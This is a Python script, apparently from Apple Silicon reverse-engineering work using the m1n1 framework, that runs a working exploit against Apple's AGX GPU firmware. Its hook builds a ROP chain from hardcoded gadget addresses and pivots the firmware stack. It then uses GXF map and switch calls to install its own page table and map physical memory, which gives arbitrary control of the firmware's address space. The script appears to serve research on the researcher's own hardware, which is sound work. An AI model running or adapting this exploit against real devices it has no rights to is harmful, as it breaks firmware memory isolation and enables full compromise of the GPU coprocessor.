#!/usr/bin/env python3
# SPDX-License-Identifier: MIT

import sys, pathlib, time
sys.path.append(str(pathlib.Path(__file__).resolve().parents[1]))

import atexit, sys

from m1n1.agx import AGX
from m1n1.agx.render import *
from m1n1.fw.agx.microsequence import *
from construct import *

from m1n1.setup import *
from m1n1 import asm

p.pmgr_adt_clocks_enable("/arm-io/gfx-asc")
p.pmgr_adt_clocks_enable("/arm-io/sgx")

agx = AGX(u)
agx.mon = mon
sgx = agx.sgx_dev

def magic(renderer, work, ms):
    work.scratch = agx.kobj.new_buf(0x4000, name="scratch", track=True)

    # dump GXF area
    #for i in range(0, 0x200, 8):
        #ms.append(Read64Cmd(0xffffff8000068000 + i))
        #ms.append(Store64Cmd(work.scratch._addr + i))
    #return

    gbl_cur_cmd_state = 0xffffff80000744b0

    v_gptbat_base = 0xffffff800004d06b
    v_kpt_pfn = 0xffffff80000680b0

    g_epilogue = 0xffffff8000021ec0

    sp = 0xffffff80000baab0 + 0x1c0
    v_lr = sp + 0x58
    v_x26 = sp + 0x10
    v_x23 = sp + 0x28
    v_x22 = sp + 0x30
    v_x21 = sp + 0x38

    g_stack_pivot = 0xffffff8000006640
    #0xffffff8000006640 : mov sp, x2 ; movz x0, #0x1 ; ret

    g_calltwo = 0xffffff8000045e24
    # 0xffffff8000045e24 :
    # ldr x8, [x22] ; ldr x8, [x8] ; mov x0, x22 ; movz w1, #0x5 ; mov x2, x23 ; mov x3, #0x0 ; blr x8 ;
    g_callone = 0xffffff8000045e3c
    # ldr x8, [x21, #0x70] ; cbz x8, #0xffffff8000045e4c ; mov x0, x26 ; blr x8
    # mov x0, x23 ;
    # ldp x29, x30, [sp, #0x80] ;
    # ldp x20, x19, [sp, #0x70] ;
    # ldp x22, x21, [sp, #0x60] ;
    # ldp x24, x23, [sp, #0x50] ;
    # ldp x26, x25, [sp, #0x40] ;
    # ldp x28, x27, [sp, #0x30] ;
    # ldp d9, d8, [sp, #0x20] ;
    # add sp, sp, #0x90 ; ret

    g_store = 0xffffff800003b310
    # 0xffffff800003b310 : str x0, [x23, #0xa78] ; ldp x29, x30, [sp, #0x40] ; ldp x20, x19, [sp, #0x30] ; ldp x22, x21, [sp, #0x20] ; ldp x24, x23, [sp, #0x10] ; ldp x26, x25, [sp], #0x50 ; ret

    g_mmu_gxf_enter = 0xffffff8000006650

    ROP_SIZE = 0x400

    rbuf = agx.kobj.new(Array(ROP_SIZE, Int64ul), name="ROP", track=True)
    p_rop = rbuf._addr

    rop = []

    def r(i):
        p = p_rop + len(rop) * 8
        rop.append(i)
        return p

    def e(v):
        p = p_rop + len(rop) * 8
        rop.extend(v)
        return p

    tmp_cmdbuf = r(0)
    pg_stack_pivot = r(g_stack_pivot)
    ppg_stack_pivot = r(pg_stack_pivot)
    pg_store = r(g_store)
    pg_epilogue = r(g_epilogue)
    pg_mmu_gxf_enter = r(g_mmu_gxf_enter)

    v_ttbrs = 0xffffff8001000000
    v_ttbr1_63 = v_ttbrs + 63 * 16

    gxf_map_args = e([
        v_ttbrs >> 14, # va
        0,  # pa
        1,      # size
        0x41b,  # EL1 RW Shared
        0,      # unk
    ])

    gxf_map_op = e([
        0x10,   # map
        gxf_map_args
    ])

    gxf_switch_args = e([
        63 << 32,   # context ID
    ])

    gxf_switch_op = e([
        0x20,   # switch
        gxf_switch_args
    ])

    if len(rop) & 1:
        r(0)

    # Low leaf PT for firmware
    v_kpt0 = 0xffffff8001fc8000
    # New page tables (AGX heap scratch)
    # Actually make this the TTBR page lol
    v_new_pt = 0xffffff80000b4000

    new_sp = e([
        # Set the TTBR1 for context 63
        # Coming from g_calltwo
        0x0aaaaaaaaa000006,
        0x0aaaaaaaaa000007,
        0x0aaaaaaaaa000008,
        0x0aaaaaaaaa000009,
        0x0aaaaaaaaa00000a,
        0x0aaaaaaaaa00000b,
        0x0bbbbbbbbb000028, # x28
        0x0bbbbbbbbb000027, # x27
    ])
    new_ttbr = e([
        0x1bbbbbbbbb000026, # x26 = x0 = value
        0x1bbbbbbbbb000025, # x25
        0x1bbbbbbbbb000024, # x24
        v_ttbr1_63 - 0xa78, # x23 = addr
        0x1bbbbbbbbb000022, # x22
        pg_store - 0x70,    # x21 = func
        0x1bbbbbbbbb000020, # x20
        0x1bbbbbbbbb000019, # x19
        0x1bbbbbbbbb000029, # x29
        g_callone,          # lr

        # Switch to context 63
        # Coming from g_store
        gxf_switch_op,      # x26 = x0 = op
        0x2bbbbbbbbb000025, # x25
        0x2bbbbbbbbb000024, # x24
        0x2bbbbbbbbb000023, # x23
        0x2bbbbbbbbb000022, # x22
        pg_mmu_gxf_enter - 0x70, # x21 = func
        0x2bbbbbbbbb000020, # x20
        0x2bbbbbbbbb000019, # x19
        0x2bbbbbbbbb000029, # x29
        g_callone,          # lr

        # Install our page table in the kernel space
        # Coming from g_callone
        0x3aaaaaaaaa000006,
        0x3aaaaaaaaa000007,
        0x3aaaaaaaaa000008,
        0x3aaaaaaaaa000009,
        0x3aaaaaaaaa00000a,
        0xaaaaaaaaaa00000b,
        0x3bbbbbbbbb000028, # x28
        0x3bbbbbbbbb000027, # x27
    ])
    ktp_pte_val = e([
        0x3bbbbbbbbb000026, # x26 = x0 = value
        0x3bbbbbbbbb000025, # x25
        0x3bbbbbbbbb000024, # x24
    ])
    kpt_pte_addr = e([
        0x3bbbbbbbbb000023, # x23 = addr
        0x3bbbbbbbbb000022, # x22
        pg_store - 0x70,    # x21 = func
        0x3bbbbbbbbb000020, # x20
        0x3bbbbbbbbb000019, # x19
        0x3bbbbbbbbb000029, # x29
        g_callone,          # lr
    ])
    def restore_reg(p):
        return e([
            # Restore x21
            # Coming from g_store
            0x4bbbbbbbbb000026, # x26 = x0 = value
            0x4bbbbbbbbb000025, # x25
            0x4bbbbbbbbb000024, # x24
            p - 0xa78,          # x23 = addr
            0x4bbbbbbbbb000022, # x22
            pg_store - 0x70,    # x21 = function
            0x4bbbbbbbbb000020, # x20
            0x4bbbbbbbbb000019, # x19
            0x4bbbbbbbbb000029, # x29
            g_callone,          # lr
        ])

    save_x21 = restore_reg(v_x21)
    save_x22 = restore_reg(v_x22)
    save_x23 = restore_reg(v_x23)
    save_x26 = restore_reg(v_x26)
    save_lr = restore_reg(v_lr)

    e([
        # Return to original stack
        # Coming from g_store
        0,                  # x26 = r0 = ret
        0x5bbbbbbbbb000025, # x25
        0x5bbbbbbbbb000024, # x24
        sp,                 # x23 = new sp
        ppg_stack_pivot,    # x22 = 1st function
        pg_epilogue - 0x70, # x21 = 2nd function
        0x5bbbbbbbbb000020, # x20
        0x5bbbbbbbbb000019, # x19
        0x5bbbbbbbbb000029, # x29
        g_calltwo,          # lr
    ])
    print(f"ROP len: {len(rop)*8:#x}")

    rbuf.val = rop + [0] * (ROP_SIZE - len(rop))
    rbuf.push()

    # Calculate pfn of the ttbr base
    vpg_ttbrs = gxf_map_args + 8
    ms.append(Read64Cmd(v_gptbat_base))
    ms.append(ALUCmd(ALUCmd.LSR, 14))
    ms.append(Store64Cmd(vpg_ttbrs))

    # Calculate physaddr of the kpte to overwrite
    ms.append(Read64Cmd(v_kpt_pfn))
    ms.append(ALUCmd(ALUCmd.LSL, 14))
    ms.append(ALUCmd(ALUCmd.XOR, 0xffffffffffffffff))
    ms.append(Add16Cmd(0xa78 - 8 * 4))
    ms.append(ALUCmd(ALUCmd.XOR, 0xffffffffffffffff))
    ms.append(Store64Cmd(kpt_pte_addr))

    # Read the page tables to find the paddr of our new PT,
    # and generate the PTE and TTBR
    # pt[0] -> self reference L1 -> L2
    ms.append(Read64Cmd(v_kpt0 + ((v_new_pt >> 14) & 0x7ff) * 8))
    ms.append(ALUCmd(ALUCmd.AND, 0xfffffffc000))
    ms.append(ALUCmd(ALUCmd.OR, 1))
    ms.append(Store64Cmd(new_ttbr))
    ms.append(ALUCmd(ALUCmd.OR, 2))
    ms.append(Store64Cmd(ktp_pte_val))
    ms.append(Store64Cmd(v_new_pt))

    # Map physical 32M pages at 0, 32M, 8G-32, 16G-32
    # This should be enough to make the exploit work regardless of RAM size,
    # the shader can map the rest
    for page in (0, 1, 255, 511):
        # pt[0x400+x] -> 0x800000000 + (x<<25)
        ms.append(Write64Cmd(v_new_pt + 0x2000 + 8 * page, 0xe0000800000409 | (page<<25)))

    # Save the stack values we will clobber,
    # and construct the new ttbr0 PT
    for src, dest in (
        (v_lr, save_lr),
        (v_x21, save_x21),
        (v_x22, save_x22),
        (v_x23, save_x23),
        (v_x26, save_x26),
    ):
        ms.append(Read64Cmd(src))
        ms.append(Store64Cmd(dest))

    # Set up our initial ROP pivot (GXF map TTBRs)
    ms.append(Write64Cmd(v_x21, pg_mmu_gxf_enter - 0x70))
    ms.append(Write64Cmd(v_x22, ppg_stack_pivot))
    ms.append(Write64Cmd(v_x23, new_sp))
    ms.append(Write64Cmd(v_x26, gxf_map_op))
    ms.append(Write64Cmd(v_lr, g_calltwo))

    # Figure out the stamp addr/val to complete the current command
    ms.append(Read64Cmd(gbl_cur_cmd_state))
    ms.append(Add16Cmd(0x10))
    store_cmd_buf = Store64Cmd(0)
    ms.append(store_cmd_buf)

    store_cmd_buf.addr = ms.cur_addr() + Read64Cmd.offsetof("addr")
    ms.append(Read64Cmd(0))
    ms.append(ALUCmd(ALUCmd.AND, 0xffffffffffffffe0))
    ms.append(Store64Cmd(tmp_cmdbuf))

    off_3d_stamp_addr =  0x8d8
    off_3d_stamp_value =  0x8e0
    off_3d_stamp_index =  0x8e4

    off_ta_stamp_addr =  0x578
    off_ta_stamp_value =  0x580
    off_ta_stamp_index =  0x584

    ms.append(Add16Cmd(off_ta_stamp_addr))
    store = Store64Cmd(0)
    ms.append(store)
    store.addr = ms.cur_addr() + Read64Cmd.offsetof("addr")
    ms.append(Read64Cmd(0))
    store_stamp_addr = Store64Cmd(0)
    ms.append(store_stamp_addr)

    ms.append(Read64Cmd(tmp_cmdbuf))
    ms.append(Add16Cmd(off_ta_stamp_value))
    store = Store64Cmd(0)
    ms.append(store)
    store.addr = ms.cur_addr() + Read32Cmd.offsetof("addr")
    ms.append(Read32Cmd(0))
    store_stamp_val = Store64Cmd(0)
    ms.append(store_stamp_val)

    ms.append(DoorbellCmd(1))

    off = ms.cur_addr()
    store_stamp_addr.addr = off + CompleteCmd.offsetof("stamp_addr")
    store_stamp_val.addr = off + CompleteCmd.offsetof("stamp_val")
    cmd = CompleteCmd()
    cmd.stamp_addr = 0
    cmd.stamp_val = 0
    ms.append(cmd)

    #off = ms.cur_addr()
    #store_stamp_addr.addr = off + AbortCmd.offsetof("stamp_addr")
    #store_stamp_val.addr = off + AbortCmd.offsetof("stamp_val")
    #cmd = AbortCmd()
    #cmd.stamp_addr = 0
    #cmd.stamp_val = 0
    #ms.append(cmd)

    ms.append(Write64Cmd(0xdead, 0))

try:
    agx.start()
    #agx.uat.dump(0)

    print("==========================================")
    print("## After init")
    print("==========================================")
    mon.poll()
    agx.poll_objects()

    ctx = GPUContext(agx)
    ctx.bind(2)

    f = GPUFrame(ctx, sys.argv[1], track=False)

    r = GPURenderer(ctx, 8, bm_slot=0x10, queue=1)
    print("==========================================")
    print("## Submitting")
    print("==========================================")

    r.mshook_ta = magic

    w = r.submit(f.cmdbuf)

    print("==========================================")
    print("## Submitted")
    print("==========================================")

    mon.poll()
    agx.poll_objects()

    print("==========================================")
    print("## Run")
    print("==========================================")

    r.run()

    while not r.ev_ta.fired:
        agx.asc.work()
        agx.poll_channels()

    #r.wait()
    agx.poll_objects()

    print("==========================================")
    print("## Scratch")
    print("==========================================")
    #chexdump(w.scratch.pull().val)
    #print(hex(w.scratch.pull().val))
    #open("68000.dump", "wb").write(w.scratch.pull().val)

    time.sleep(1)
    agx.poll_channels()
    agx.kick_firmware()
    agx.asc.work()
    agx.asc.work()
    agx.poll_channels()
    #agx.asc.crash.crash_hard()
    #agx.poll_channels()
    time.sleep(1)
    agx.poll_channels()
    agx.asc.work()
    agx.asc.work()
    agx.poll_channels()

    w = r.submit(f.cmdbuf)
    r.run()
    time.sleep(1)
    agx.poll_channels()

finally:
    mon.poll()
    agx.poll_objects()
    agx.uat.invalidate_cache()
    print(repr(agx.uat.iotranslate(0, 0xffffff8001000000, 0x10)))
    #print("UAT dump:")
    #agx.uat.dump(0)
    #print(f"Val: {p.read64(0x810000000):#x}")
    p.reboot()
